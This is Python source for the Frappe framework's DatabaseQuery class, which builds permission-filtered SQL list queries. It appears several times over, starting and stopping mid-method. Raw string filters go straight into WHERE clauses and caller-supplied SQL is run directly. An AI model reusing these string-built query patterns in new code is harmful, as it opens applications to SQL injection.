		"""Removes optional columns like `_user_tags`, `_comments` etc. if not in table"""
		columns = frappe.db.get_table_columns(self.doctype)

		# remove from fields
		to_remove = []
		for fld in self.fields:
			for f in optional_fields:
				if f in fld and not f in columns:
					to_remove.append(fld)

		for fld in to_remove:
			del self.fields[self.fields.index(fld)]

		# remove from filters
		to_remove = []
		for each in self.filters:
			if isinstance(each, basestring):
				each = [each]

			for element in each:
				if element in optional_fields and element not in columns:
					to_remove.append(each)

		for each in to_remove:
			if isinstance(self.filters, dict):
				del self.filters[each]
			else:
				self.filters.remove(each)

	def build_conditions(self):
		self.conditions = []
		self.grouped_or_conditions = []
		self.build_filter_conditions(self.filters, self.conditions)
		self.build_filter_conditions(self.or_filters, self.grouped_or_conditions)

		# match conditions
		if not self.flags.ignore_permissions:
			match_conditions = self.build_match_conditions()
			if match_conditions:
				self.conditions.append("(" + match_conditions + ")")

	def build_filter_conditions(self, filters, conditions):
		"""build conditions from user filters"""
		if isinstance(filters, dict):
			filters = [filters]

		for f in filters:
			if isinstance(f, basestring):
				conditions.append(f)
			else:
				conditions.append(self.prepare_filter_condition(f))

	def prepare_filter_condition(self, f):
		"""Returns a filter condition in the format:

				ifnull(`tabDocType`.`fieldname`, fallback) operator "value"
		"""

		f = get_filter(self.doctype, f)

		tname = ('`tab' + f.doctype + '`')
		if not tname in self.tables:
			self.append_table(tname)

		if 'ifnull(' in f.fieldname:
			column_name = f.fieldname
		else:
			column_name = '{tname}.{fname}'.format(tname=tname,
				fname=f.fieldname)

		can_be_null = True

		# prepare in condition
		if f.operator in ('in', 'not in'):
			values = f.value
			if not isinstance(values, (list, tuple)):
				values = values.split(",")

			fallback = "''"
			value = (frappe.db.escape((v or '').strip(), percent=False) for v in values)
			value = '("{0}")'.format('", "'.join(value))
		else:
			df = frappe.get_meta(f.doctype).get("fields", {"fieldname": f.fieldname})
			df = df[0] if df else None

			if df and df.fieldtype in ("Check", "Float", "Int", "Currency", "Percent"):
				can_be_null = False

			if f.operator=='Between' and \
				(f.fieldname in ('creation', 'modified') or (df and (df.fieldtype=="Date" or df.fieldtype=="Datetime"))):
				value = "'%s' AND '%s'" % (
					get_datetime(f.value[0]).strftime("%Y-%m-%d %H:%M:%S.%f"),
					add_to_date(get_datetime(f.value[1]),days=1).strftime("%Y-%m-%d %H:%M:%S.%f"))
				fallback = "'0000-00-00 00:00:00'"
			elif df and df.fieldtype=="Date":
				value = getdate(f.value).strftime("%Y-%m-%d")
				fallback = "'0000-00-00'"

			elif df and df.fieldtype=="Datetime":
				value = get_datetime(f.value).strftime("%Y-%m-%d %H:%M:%S.%f")
				fallback = "'0000-00-00 00:00:00'"

			elif df and df.fieldtype=="Time":
				value = get_time(f.value).strftime("%H:%M:%S.%f")
				fallback = "'00:00:00'"

			elif f.operator in ("like", "not like") or (isinstance(f.value, basestring) and
				(not df or df.fieldtype not in ["Float", "Int", "Currency", "Percent", "Check"])):
					value = "" if f.value==None else f.value
					fallback = '""'

					if f.operator in ("like", "not like") and isinstance(value, basestring):
						# because "like" uses backslash (\) for escaping
						value = value.replace("\\", "\\\\").replace("%", "%%")

			else:
				value = flt(f.value)
				fallback = 0

			# put it inside double quotes
			if isinstance(value, basestring) and not f.operator=='Between':
				value = '"{0}"'.format(frappe.db.escape(value, percent=False))

		if (self.ignore_ifnull
			or not can_be_null
			or (f.value and f.operator in ('=', 'like'))
			or 'ifnull(' in column_name.lower()):
			condition = '{column_name} {operator} {value}'.format(
				column_name=column_name, operator=f.operator,
				value=value)
		else:
			condition = 'ifnull({column_name}, {fallback}) {operator} {value}'.format(
				column_name=column_name, fallback=fallback, operator=f.operator,
				value=value)

		return condition

	def build_match_conditions(self, as_condition=True):
		"""add match conditions if applicable"""
		self.match_filters = []
		self.match_conditions = []
		only_if_shared = False
		if not self.user:
			self.user = frappe.session.user

		if not self.tables: self.extract_tables()

		meta = frappe.get_meta(self.doctype)                    
		role_permissions = frappe.permissions.get_role_permissions(meta, user=self.user)

		self.shared = frappe.share.get_shared(self.doctype, self.user)

		if not meta.istable and not role_permissions.get("read") and not self.flags.ignore_permissions:
			only_if_shared = True
			if not self.shared:
				frappe.throw(_("No permission to read {0}").format(self.doctype), frappe.PermissionError)
			else:
				self.conditions.append(self.get_share_condition())

		else:
			# apply user permissions?
			if role_permissions.get("apply_user_permissions", {}).get("read"):
				# get user permissions
				user_permissions = frappe.defaults.get_user_permissions(self.user)
				self.add_user_permissions(user_permissions,
					user_permission_doctypes=role_permissions.get("user_permission_doctypes").get("read"))

			if role_permissions.get("if_owner", {}).get("read"):
				self.match_conditions.append("`tab{0}`.owner = '{1}'".format(self.doctype,
					frappe.db.escape(self.user, percent=False)))

		if as_condition:
			conditions = ""
			if self.match_conditions:
				# will turn out like ((blog_post in (..) and blogger in (...)) or (blog_category in (...)))
				conditions = "((" + ") or (".join(self.match_conditions) + "))"

			doctype_conditions = self.get_permission_query_conditions()
			if doctype_conditions:
				conditions += (' and ' + doctype_conditions) if conditions else doctype_conditions

			# share is an OR condition, if there is a role permission
			if not only_if_shared and self.shared and conditions:
				conditions =  "({conditions}) or ({shared_condition})".format(
					conditions=conditions, shared_condition=self.get_share_condition())

			return conditions

		else:
			return self.match_filters

	def get_share_condition(self):
		return """`tab{0}`.name in ({1})""".format(self.doctype, ", ".join(["'%s'"] * len(self.shared))) % \
			tuple([frappe.db.escape(s, percent=False) for s in self.shared])

	def add_user_permissions(self, user_permissions, user_permission_doctypes=None):
		user_permission_doctypes = frappe.permissions.get_user_permission_doctypes(user_permission_doctypes, user_permissions)
		meta = frappe.get_meta(self.doctype)                    

		for doctypes in user_permission_doctypes:
			match_filters = {}
			match_conditions = []
			# check in links
			for df in meta.get_fields_to_check_permissions(doctypes):
				user_permission_values = user_permissions.get(df.options, [])

				condition = 'ifnull(`tab{doctype}`.`{fieldname}`, "")=""'.format(doctype=self.doctype, fieldname=df.fieldname)
				if user_permission_values:
					condition += """ or `tab{doctype}`.`{fieldname}` in ({values})""".format(
						doctype=self.doctype, fieldname=df.fieldname,
						values=", ".join([('"'+frappe.db.escape(v, percent=False)+'"') for v in user_permission_values])
					)
				match_conditions.append("({condition})".format(condition=condition))

				match_filters[df.options] = user_permission_values

			if match_conditions:
				self.match_conditions.append(" and ".join(match_conditions))

			if match_filters:
				self.match_filters.append(match_filters)

	def get_permission_query_conditions(self):
		condition_methods = frappe.get_hooks("permission_query_conditions", {}).get(self.doctype, [])
		if condition_methods:
			conditions = []
			for method in condition_methods:
				c = frappe.call(frappe.get_attr(method), self.user)
				if c:
					conditions.append(c)

			return " and ".join(conditions) if conditions else None

	def run_custom_query(self, query):
		if '%(key)s' in query:
			query = query.replace('%(key)s', 'name')
		return frappe.db.sql(query, as_dict = (not self.as_list))

	def set_order_by(self, args):                    
		meta = frappe.get_meta(self.doctype)                    
		if self.order_by:
			args.order_by = self.order_by
		else:
			args.order_by = ""

			# don't add order by from meta if a mysql group function is used without group by clause
			group_function_without_group_by = (len(self.fields)==1 and
				(	self.fields[0].lower().startswith("count(")
					or self.fields[0].lower().startswith("min(")
					or self.fields[0].lower().startswith("max(")
				) and not self.group_by)

			if not group_function_without_group_by:
				sort_field = sort_order = None
				if meta.sort_field and ',' in meta.sort_field:
					# multiple sort given in doctype definition
					# Example:
					# `idx desc, modified desc`
					# will covert to
					# `tabItem`.`idx` desc, `tabItem`.`modified` desc
					args.order_by = ', '.join(['`tab{0}`.`{1}` {2}'.format(self.doctype,
						f.split()[0].strip(), f.split()[1].strip()) for f in meta.sort_field.split(',')])
				else:
					sort_field = meta.sort_field or 'modified'
					sort_order = (meta.sort_field and meta.sort_order) or 'desc'

					args.order_by = "`tab{0}`.`{1}` {2}".format(self.doctype, sort_field or "modified", sort_order or "desc")

				# draft docs always on top
				if meta.is_submittable:
					args.order_by = "`tab{0}`.docstatus asc, {1}".format(self.doctype, args.order_by)

	def check_sort_by_table(self, order_by):                    
		if "." in order_by:                    
			tbl = order_by.split('.')[0]                    
			if tbl not in self.tables:                    
				if tbl.startswith('`'):                    
					tbl = tbl[4:-1]                    
				frappe.throw(_("Please select atleast 1 column from {0} to sort").format(tbl))                    

	def add_limit(self):
		if self.limit_page_length:
			return 'limit %s, %s' % (self.limit_start, self.limit_page_length)
		else:
			return ''

	def add_comment_count(self, result):
		for r in result:
			if not r.name:
				continue

			r._comment_count = 0
			if "_comments" in r:
				r._comment_count = len(json.loads(r._comments or "[]"))

	def update_list_settings(self):
		# update list settings if new search
		list_settings = json.loads(get_list_settings(self.doctype) or '{}')
		list_settings['filters'] = self.filters
		list_settings['limit'] = self.limit_page_length
		list_settings['order_by'] = self.order_by

		if self.save_list_settings_fields:
			list_settings['fields'] = self.list_settings_fields

		update_list_settings(self.doctype, list_settings)


# Copyright (c) 2015, Frappe Technologies Pvt. Ltd. and Contributors
# MIT License. See license.txt

from __future__ import unicode_literals
"""build query for doclistview and return results"""

import frappe, json, copy
import frappe.defaults
import frappe.share
import frappe.permissions
from frappe.utils import flt, cint, getdate, get_datetime, get_time, make_filter_tuple, get_filter, add_to_date
from frappe import _
from frappe.model import optional_fields
from frappe.model.utils.list_settings import get_list_settings, update_list_settings

class DatabaseQuery(object):
	def __init__(self, doctype):
		self.doctype = doctype
		self.tables = []
		self.conditions = []
		self.or_conditions = []
		self.fields = None
		self.user = None
		self.ignore_ifnull = False
		self.flags = frappe._dict()

	def execute(self, query=None, fields=None, filters=None, or_filters=None,
		docstatus=None, group_by=None, order_by=None, limit_start=False,
		limit_page_length=None, as_list=False, with_childnames=False, debug=False,
		ignore_permissions=False, user=None, with_comment_count=False,
		join='left join', distinct=False, start=None, page_length=None, limit=None,
		ignore_ifnull=False, save_list_settings=False, save_list_settings_fields=False,
		update=None, add_total_row=None):
		if not ignore_permissions and not frappe.has_permission(self.doctype, "read", user=user):
			raise frappe.PermissionError, self.doctype

		# fitlers and fields swappable
		# its hard to remember what comes first
		if (isinstance(fields, dict)
			or (isinstance(fields, list) and fields and isinstance(fields[0], list))):
			# if fields is given as dict/list of list, its probably filters
			filters, fields = fields, filters

		elif fields and isinstance(filters, list) \
			and len(filters) > 1 and isinstance(filters[0], basestring):
			# if `filters` is a list of strings, its probably fields
			filters, fields = fields, filters

		if fields:
			self.fields = fields
		else:
			self.fields =  ["`tab{0}`.`name`".format(self.doctype)]

		if start: limit_start = start
		if page_length: limit_page_length = page_length
		if limit: limit_page_length = limit

		self.filters = filters or []
		self.or_filters = or_filters or []
		self.docstatus = docstatus or []
		self.group_by = group_by
		self.order_by = order_by
		self.limit_start = 0 if (limit_start is False) else cint(limit_start)
		self.limit_page_length = cint(limit_page_length) if limit_page_length else None
		self.with_childnames = with_childnames
		self.debug = debug
		self.join = join
		self.distinct = distinct
		self.as_list = as_list
		self.ignore_ifnull = ignore_ifnull
		self.flags.ignore_permissions = ignore_permissions
		self.user = user or frappe.session.user
		self.update = update
		self.list_settings_fields = copy.deepcopy(self.fields)
		#self.debug = True

		if query:
			result = self.run_custom_query(query)
		else:
			result = self.build_and_run()

		if with_comment_count and not as_list and self.doctype:
			self.add_comment_count(result)

		if save_list_settings:
			self.save_list_settings_fields = save_list_settings_fields
			self.update_list_settings()

		return result

	def build_and_run(self):
		args = self.prepare_args()
		args.limit = self.add_limit()

		if args.conditions:
			args.conditions = "where " + args.conditions

		if self.distinct:
			args.fields = 'distinct ' + args.fields

		query = """select %(fields)s from %(tables)s %(conditions)s
			%(group_by)s %(order_by)s %(limit)s""" % args

		return frappe.db.sql(query, as_dict=not self.as_list, debug=self.debug, update=self.update)

	def prepare_args(self):
		self.parse_args()
		self.extract_tables()
		self.set_optional_columns()
		self.build_conditions()

		args = frappe._dict()

		if self.with_childnames:
			for t in self.tables:
				if t != "`tab" + self.doctype + "`":
					self.fields.append(t + ".name as '%s:name'" % t[4:-1])

		# query dict
		args.tables = self.tables[0]

		# left join parent, child tables
		for child in self.tables[1:]:
			args.tables += " {join} {child} on ({child}.parent = {main}.name)".format(join=self.join,
				child=child, main=self.tables[0])

		if self.grouped_or_conditions:
			self.conditions.append("({0})".format(" or ".join(self.grouped_or_conditions)))

		args.conditions = ' and '.join(self.conditions)

		if self.or_conditions:
			args.conditions += (' or ' if args.conditions else "") + \
				 ' or '.join(self.or_conditions)

		self.set_field_tables()

		args.fields = ', '.join(self.fields)

		self.set_order_by(args)                    
		self.check_sort_by_table(args.order_by)                    
		args.order_by = args.order_by and (" order by " + args.order_by) or ""

		args.group_by = self.group_by and (" group by " + self.group_by) or ""

		return args

	def parse_args(self):
		"""Convert fields and filters from strings to list, dicts"""
		if isinstance(self.fields, basestring):
			if self.fields == "*":
				self.fields = ["*"]
			else:
				try:
					self.fields = json.loads(self.fields)
				except ValueError:
					self.fields = [f.strip() for f in self.fields.split(",")]

		for filter_name in ["filters", "or_filters"]:
			filters = getattr(self, filter_name)
			if isinstance(filters, basestring):
				filters = json.loads(filters)

			if isinstance(filters, dict):
				fdict = filters
				filters = []
				for key, value in fdict.iteritems():
					filters.append(make_filter_tuple(self.doctype, key, value))
			setattr(self, filter_name, filters)

	def extract_tables(self):
		"""extract tables from fields"""
		self.tables = ['`tab' + self.doctype + '`']

		# add tables from fields
		if self.fields:
			for f in self.fields:
				if ( not ("tab" in f and "." in f) ) or ("locate(" in f): continue


				table_name = f.split('.')[0]
				if table_name.lower().startswith('group_concat('):
					table_name = table_name[13:]
				if table_name.lower().startswith('ifnull('):
					table_name = table_name[7:]
				if not table_name[0]=='`':
					table_name = '`' + table_name + '`'
				if not table_name in self.tables:
					self.append_table(table_name)

	def append_table(self, table_name):
		self.tables.append(table_name)
		doctype = table_name[4:-1]
		if (not self.flags.ignore_permissions) and (not frappe.has_permission(doctype)):
			raise frappe.PermissionError, doctype

	def set_field_tables(self):
		'''If there are more than one table, the fieldname must not be ambigous.
		If the fieldname is not explicitly mentioned, set the default table'''
		if len(self.tables) > 1:
			for i, f in enumerate(self.fields):
				if '.' not in f:
					self.fields[i] = '{0}.{1}'.format(self.tables[0], f)

	def set_optional_columns(self):
		"""Removes optional columns like `_user_tags`, `_comments` etc. if not in table"""
		columns = frappe.db.get_table_columns(self.doctype)

		# remove from fields
		to_remove = []
		for fld in self.fields:
			for f in optional_fields:
				if f in fld and not f in columns:
					to_remove.append(fld)

		for fld in to_remove:
			del self.fields[self.fields.index(fld)]

		# remove from filters
		to_remove = []
		for each in self.filters:
			if isinstance(each, basestring):
				each = [each]

			for element in each:
				if element in optional_fields and element not in columns:
					to_remove.append(each)

		for each in to_remove:
			if isinstance(self.filters, dict):
				del self.filters[each]
			else:
				self.filters.remove(each)

	def build_conditions(self):
		self.conditions = []
		self.grouped_or_conditions = []
		self.build_filter_conditions(self.filters, self.conditions)
		self.build_filter_conditions(self.or_filters, self.grouped_or_conditions)

		# match conditions
		if not self.flags.ignore_permissions:
			match_conditions = self.build_match_conditions()
			if match_conditions:
				self.conditions.append("(" + match_conditions + ")")

	def build_filter_conditions(self, filters, conditions):
		"""build conditions from user filters"""
		if isinstance(filters, dict):
			filters = [filters]

		for f in filters:
			if isinstance(f, basestring):
				conditions.append(f)
			else:
				conditions.append(self.prepare_filter_condition(f))

	def prepare_filter_condition(self, f):
		"""Returns a filter condition in the format:

				ifnull(`tabDocType`.`fieldname`, fallback) operator "value"
		"""

		f = get_filter(self.doctype, f)

		tname = ('`tab' + f.doctype + '`')
		if not tname in self.tables:
			self.append_table(tname)

		if 'ifnull(' in f.fieldname:
			column_name = f.fieldname
		else:
			column_name = '{tname}.{fname}'.format(tname=tname,
				fname=f.fieldname)

		can_be_null = True

		# prepare in condition
		if f.operator in ('in', 'not in'):
			values = f.value
			if not isinstance(values, (list, tuple)):
				values = values.split(",")

			fallback = "''"
			value = (frappe.db.escape((v or '').strip(), percent=False) for v in values)
			value = '("{0}")'.format('", "'.join(value))
		else:
			df = frappe.get_meta(f.doctype).get("fields", {"fieldname": f.fieldname})
			df = df[0] if df else None

			if df and df.fieldtype in ("Check", "Float", "Int", "Currency", "Percent"):
				can_be_null = False

			if f.operator=='Between' and \
				(f.fieldname in ('creation', 'modified') or (df and (df.fieldtype=="Date" or df.fieldtype=="Datetime"))):
				value = "'%s' AND '%s'" % (
					get_datetime(f.value[0]).strftime("%Y-%m-%d %H:%M:%S.%f"),
					add_to_date(get_datetime(f.value[1]),days=1).strftime("%Y-%m-%d %H:%M:%S.%f"))
				fallback = "'0000-00-00 00:00:00'"
			elif df and df.fieldtype=="Date":
				value = getdate(f.value).strftime("%Y-%m-%d")
				fallback = "'0000-00-00'"

			elif df and df.fieldtype=="Datetime":
				value = get_datetime(f.value).strftime("%Y-%m-%d %H:%M:%S.%f")
				fallback = "'0000-00-00 00:00:00'"

			elif df and df.fieldtype=="Time":
				value = get_time(f.value).strftime("%H:%M:%S.%f")
				fallback = "'00:00:00'"

			elif f.operator in ("like", "not like") or (isinstance(f.value, basestring) and
				(not df or df.fieldtype not in ["Float", "Int", "Currency", "Percent", "Check"])):
					value = "" if f.value==None else f.value
					fallback = '""'

					if f.operator in ("like", "not like") and isinstance(value, basestring):
						# because "like" uses backslash (\) for escaping
						value = value.replace("\\", "\\\\").replace("%", "%%")

			else:
				value = flt(f.value)
				fallback = 0

			# put it inside double quotes
			if isinstance(value, basestring) and not f.operator=='Between':
				value = '"{0}"'.format(frappe.db.escape(value, percent=False))

		if (self.ignore_ifnull
			or not can_be_null
			or (f.value and f.operator in ('=', 'like'))
			or 'ifnull(' in column_name.lower()):
			condition = '{column_name} {operator} {value}'.format(
				column_name=column_name, operator=f.operator,
				value=value)
		else:
			condition = 'ifnull({column_name}, {fallback}) {operator} {value}'.format(
				column_name=column_name, fallback=fallback, operator=f.operator,
				value=value)

		return condition

	def build_match_conditions(self, as_condition=True):
		"""add match conditions if applicable"""
		self.match_filters = []
		self.match_conditions = []
		only_if_shared = False
		if not self.user:
			self.user = frappe.session.user

		if not self.tables: self.extract_tables()

		meta = frappe.get_meta(self.doctype)                    
		role_permissions = frappe.permissions.get_role_permissions(meta, user=self.user)

		self.shared = frappe.share.get_shared(self.doctype, self.user)

		if not meta.istable and not role_permissions.get("read") and not self.flags.ignore_permissions:
			only_if_shared = True
			if not self.shared:
				frappe.throw(_("No permission to read {0}").format(self.doctype), frappe.PermissionError)
			else:
				self.conditions.append(self.get_share_condition())

		else:
			# apply user permissions?
			if role_permissions.get("apply_user_permissions", {}).get("read"):
				# get user permissions
				user_permissions = frappe.defaults.get_user_permissions(self.user)
				self.add_user_permissions(user_permissions,
					user_permission_doctypes=role_permissions.get("user_permission_doctypes").get("read"))

			if role_permissions.get("if_owner", {}).get("read"):
				self.match_conditions.append("`tab{0}`.owner = '{1}'".format(self.doctype,
					frappe.db.escape(self.user, percent=False)))

		if as_condition:
			conditions = ""
			if self.match_conditions:
				# will turn out like ((blog_post in (..) and blogger in (...)) or (blog_category in (...)))
				conditions = "((" + ") or (".join(self.match_conditions) + "))"

			doctype_conditions = self.get_permission_query_conditions()
			if doctype_conditions:
				conditions += (' and ' + doctype_conditions) if conditions else doctype_conditions

			# share is an OR condition, if there is a role permission
			if not only_if_shared and self.shared and conditions:
				conditions =  "({conditions}) or ({shared_condition})".format(
					conditions=conditions, shared_condition=self.get_share_condition())

			return conditions

		else:
			return self.match_filters

	def get_share_condition(self):
		return """`tab{0}`.name in ({1})""".format(self.doctype, ", ".join(["'%s'"] * len(self.shared))) % \
			tuple([frappe.db.escape(s, percent=False) for s in self.shared])

	def add_user_permissions(self, user_permissions, user_permission_doctypes=None):
		user_permission_doctypes = frappe.permissions.get_user_permission_doctypes(user_permission_doctypes, user_permissions)
		meta = frappe.get_meta(self.doctype)                    

		for doctypes in user_permission_doctypes:
			match_filters = {}
			match_conditions = []
			# check in links
			for df in meta.get_fields_to_check_permissions(doctypes):
				user_permission_values = user_permissions.get(df.options, [])

				condition = 'ifnull(`tab{doctype}`.`{fieldname}`, "")=""'.format(doctype=self.doctype, fieldname=df.fieldname)
				if user_permission_values:
					condition += """ or `tab{doctype}`.`{fieldname}` in ({values})""".format(
						doctype=self.doctype, fieldname=df.fieldname,
						values=", ".join([('"'+frappe.db.escape(v, percent=False)+'"') for v in user_permission_values])
					)
				match_conditions.append("({condition})".format(condition=condition))

				match_filters[df.options] = user_permission_values

			if match_conditions:
				self.match_conditions.append(" and ".join(match_conditions))

			if match_filters:
				self.match_filters.append(match_filters)

	def get_permission_query_conditions(self):
		condition_methods = frappe.get_hooks("permission_query_conditions", {}).get(self.doctype, [])
		if condition_methods:
			conditions = []
			for method in condition_methods:
				c = frappe.call(frappe.get_attr(method), self.user)
				if c:
					conditions.append(c)

			return " and ".join(conditions) if conditions else None

	def run_custom_query(self, query):
		if '%(key)s' in query:
			query = query.replace('%(key)s', 'name')
		return frappe.db.sql(query, as_dict = (not self.as_list))

	def set_order_by(self, args):                    
		meta = frappe.get_meta(self.doctype)                    
		if self.order_by:
			args.order_by = self.order_by
		else:
			args.order_by = ""

			# don't add order by from meta if a mysql group function is used without group by clause
			group_function_without_group_by = (len(self.fields)==1 and
				(	self.fields[0].lower().startswith("count(")
					or self.fields[0].lower().startswith("min(")
					or self.fields[0].lower().startswith("max(")
				) and not self.group_by)

			if not group_function_without_group_by:
				sort_field = sort_order = None
				if meta.sort_field and ',' in meta.sort_field:
					# multiple sort given in doctype definition
					# Example:
					# `idx desc, modified desc`
					# will covert to
					# `tabItem`.`idx` desc, `tabItem`.`modified` desc
					args.order_by = ', '.join(['`tab{0}`.`{1}` {2}'.format(self.doctype,
						f.split()[0].strip(), f.split()[1].strip()) for f in meta.sort_field.split(',')])
				else:
					sort_field = meta.sort_field or 'modified'
					sort_order = (meta.sort_field and meta.sort_order) or 'desc'

					args.order_by = "`tab{0}`.`{1}` {2}".format(self.doctype, sort_field or "modified", sort_order or "desc")

				# draft docs always on top
				if meta.is_submittable:
					args.order_by = "`tab{0}`.docstatus asc, {1}".format(self.doctype, args.order_by)

	def check_sort_by_table(self, order_by):                    
		if "." in order_by:                    
			tbl = order_by.split('.')[0]                    
			if tbl not in self.tables:                    
				if tbl.startswith('`'):                    
					tbl = tbl[4:-1]                    
				frappe.throw(_("Please select atleast 1 column from {0} to sort").format(tbl))                    

	def add_limit(self):
		if self.limit_page_length:
			return 'limit %s, %s' % (self.limit_start, self.limit_page_length)
		else:
			return ''

	def add_comment_count(self, result):
		for r in result:
			if not r.name:
				continue

			r._comment_count = 0
			if "_comments" in r:
				r._comment_count = len(json.loads(r._comments or "[]"))

	def update_list_settings(self):
		# update list settings if new search
		list_settings = json.loads(get_list_settings(self.doctype) or '{}')
		list_settings['filters'] = self.filters
		list_settings['limit'] = self.limit_page_length
		list_settings['order_by'] = self.order_by

		if self.save_list_settings_fields:
			list_settings['fields'] = self.list_settings_fields

		update_list_settings(self.doctype, list_settings)


# Copyright (c) 2015, Frappe Technologies Pvt. Ltd. and Contributors
# MIT License. See license.txt

from __future__ import unicode_literals
"""build query for doclistview and return results"""

import frappe, json, copy
import frappe.defaults
import frappe.share
import frappe.permissions
from frappe.utils import flt, cint, getdate, get_datetime, get_time, make_filter_tuple, get_filter, add_to_date
from frappe import _
from frappe.model import optional_fields
from frappe.model.utils.list_settings import get_list_settings, update_list_settings

class DatabaseQuery(object):
	def __init__(self, doctype):
		self.doctype = doctype
		self.tables = []
		self.conditions = []
		self.or_conditions = []
		self.fields = None
		self.user = None
		self.ignore_ifnull = False
		self.flags = frappe._dict()

	def execute(self, query=None, fields=None, filters=None, or_filters=None,
		docstatus=None, group_by=None, order_by=None, limit_start=False,
		limit_page_length=None, as_list=False, with_childnames=False, debug=False,
		ignore_permissions=False, user=None, with_comment_count=False,
		join='left join', distinct=False, start=None, page_length=None, limit=None,
		ignore_ifnull=False, save_list_settings=False, save_list_settings_fields=False,
		update=None, add_total_row=None):
		if not ignore_permissions and not frappe.has_permission(self.doctype, "read", user=user):
			raise frappe.PermissionError, self.doctype

		# fitlers and fields swappable
		# its hard to remember what comes first
		if (isinstance(fields, dict)
			or (isinstance(fields, list) and fields and isinstance(fields[0], list))):
			# if fields is given as dict/list of list, its probably filters
			filters, fields = fields, filters

		elif fields and isinstance(filters, list) \
			and len(filters) > 1 and isinstance(filters[0], basestring):
			# if `filters` is a list of strings, its probably fields
			filters, fields = fields, filters

		if fields:
			self.fields = fields
		else:
			self.fields =  ["`tab{0}`.`name`".format(self.doctype)]

		if start: limit_start = start
		if page_length: limit_page_length = page_length
		if limit: limit_page_length = limit

		self.filters = filters or []
		self.or_filters = or_filters or []
		self.docstatus = docstatus or []
		self.group_by = group_by
		self.order_by = order_by
		self.limit_start = 0 if (limit_start is False) else cint(limit_start)
		self.limit_page_length = cint(limit_page_length) if limit_page_length else None
		self.with_childnames = with_childnames
		self.debug = debug
		self.join = join
		self.distinct = distinct
		self.as_list = as_list
		self.ignore_ifnull = ignore_ifnull
		self.flags.ignore_permissions = ignore_permissions
		self.user = user or frappe.session.user
		self.update = update
		self.list_settings_fields = copy.deepcopy(self.fields)
		#self.debug = True

		if query:
			result = self.run_custom_query(query)
		else:
			result = self.build_and_run()

		if with_comment_count and not as_list and self.doctype:
			self.add_comment_count(result)

		if save_list_settings:
			self.save_list_settings_fields = save_list_settings_fields
			self.update_list_settings()

		return result

	def build_and_run(self):
		args = self.prepare_args()
		args.limit = self.add_limit()

		if args.conditions:
			args.conditions = "where " + args.conditions

		if self.distinct:
			args.fields = 'distinct ' + args.fields

		query = """select %(fields)s from %(tables)s %(conditions)s
			%(group_by)s %(order_by)s %(limit)s""" % args

		return frappe.db.sql(query, as_dict=not self.as_list, debug=self.debug, update=self.update)

	def prepare_args(self):
		self.parse_args()
		self.extract_tables()
		self.set_optional_columns()
		self.build_conditions()

		args = frappe._dict()

		if self.with_childnames:
			for t in self.tables:
				if t != "`tab" + self.doctype + "`":
					self.fields.append(t + ".name as '%s:name'" % t[4:-1])

		# query dict
		args.tables = self.tables[0]

		# left join parent, child tables
		for child in self.tables[1:]:
			args.tables += " {join} {child} on ({child}.parent = {main}.name)".format(join=self.join,
				child=child, main=self.tables[0])

		if self.grouped_or_conditions:
			self.conditions.append("({0})".format(" or ".join(self.grouped_or_conditions)))

		args.conditions = ' and '.join(self.conditions)

		if self.or_conditions:
			args.conditions += (' or ' if args.conditions else "") + \
				 ' or '.join(self.or_conditions)

		self.set_field_tables()

		args.fields = ', '.join(self.fields)

		self.set_order_by(args)                    
		self.check_sort_by_table(args.order_by)                    
		args.order_by = args.order_by and (" order by " + args.order_by) or ""

		args.group_by = self.group_by and (" group by " + self.group_by) or ""

		return args

	def parse_args(self):
		"""Convert fields and filters from strings to list, dicts"""
		if isinstance(self.fields, basestring):
			if self.fields == "*":
				self.fields = ["*"]
			else:
				try:
					self.fields = json.loads(self.fields)
				except ValueError:
					self.fields = [f.strip() for f in self.fields.split(",")]

		for filter_name in ["filters", "or_filters"]:
			filters = getattr(self, filter_name)
			if isinstance(filters, basestring):
				filters = json.loads(filters)

			if isinstance(filters, dict):
				fdict = filters
				filters = []
				for key, value in fdict.iteritems():
					filters.append(make_filter_tuple(self.doctype, key, value))
			setattr(self, filter_name, filters)

	def extract_tables(self):
		"""extract tables from fields"""
		self.tables = ['`tab' + self.doctype + '`']

		# add tables from fields
		if self.fields:
			for f in self.fields:
				if ( not ("tab" in f and "." in f) ) or ("locate(" in f): continue


				table_name = f.split('.')[0]
				if table_name.lower().startswith('group_concat('):
					table_name = table_name[13:]
				if table_name.lower().startswith('ifnull('):
					table_name = table_name[7:]
				if not table_name[0]=='`':
					table_name = '`' + table_name + '`'
				if not table_name in self.tables:
					self.append_table(table_name)

	def append_table(self, table_name):
		self.tables.append(table_name)
		doctype = table_name[4:-1]
		if (not self.flags.ignore_permissions) and (not frappe.has_permission(doctype)):
			raise frappe.PermissionError, doctype

	def set_field_tables(self):
		'''If there are more than one table, the fieldname must not be ambigous.
		If the fieldname is not explicitly mentioned, set the default table'''
		if len(self.tables) > 1:
			for i, f in enumerate(self.fields):
				if '.' not in f:
					self.fields[i] = '{0}.{1}'.format(self.tables[0], f)

	def set_optional_columns(self):
		"""Removes optional columns like `_user_tags`, `_comments` etc. if not in table"""
		columns = frappe.db.get_table_columns(self.doctype)

		# remove from fields
		to_remove = []
		for fld in self.fields:
			for f in optional_fields:
				if f in fld and not f in columns:
					to_remove.append(fld)

		for fld in to_remove:
			del self.fields[self.fields.index(fld)]

		# remove from filters
		to_remove = []
		for each in self.filters:
			if isinstance(each, basestring):
				each = [each]

			for element in each:
				if element in optional_fields and element not in columns:
					to_remove.append(each)

		for each in to_remove:
			if isinstance(self.filters, dict):
				del self.filters[each]
			else:
				self.filters.remove(each)

	def build_conditions(self):
		self.conditions = []
		self.grouped_or_conditions = []
		self.build_filter_conditions(self.filters, self.conditions)
		self.build_filter_conditions(self.or_filters, self.grouped_or_conditions)

		# match conditions
		if not self.flags.ignore_permissions:
			match_conditions = self.build_match_conditions()
			if match_conditions:
				self.conditions.append("(" + match_conditions + ")")

	def build_filter_conditions(self, filters, conditions):
		"""build conditions from user filters"""
		if isinstance(filters, dict):
			filters = [filters]

		for f in filters:
			if isinstance(f, basestring):
				conditions.append(f)
			else:
				conditions.append(self.prepare_filter_condition(f))

	def prepare_filter_condition(self, f):
		"""Returns a filter condition in the format:

				ifnull(`tabDocType`.`fieldname`, fallback) operator "value"
		"""

		f = get_filter(self.doctype, f)

		tname = ('`tab' + f.doctype + '`')
		if not tname in self.tables:
			self.append_table(tname)

		if 'ifnull(' in f.fieldname:
			column_name = f.fieldname
		else:
			column_name = '{tname}.{fname}'.format(tname=tname,
				fname=f.fieldname)

		can_be_null = True

		# prepare in condition
		if f.operator in ('in', 'not in'):
			values = f.value
			if not isinstance(values, (list, tuple)):
				values = values.split(",")
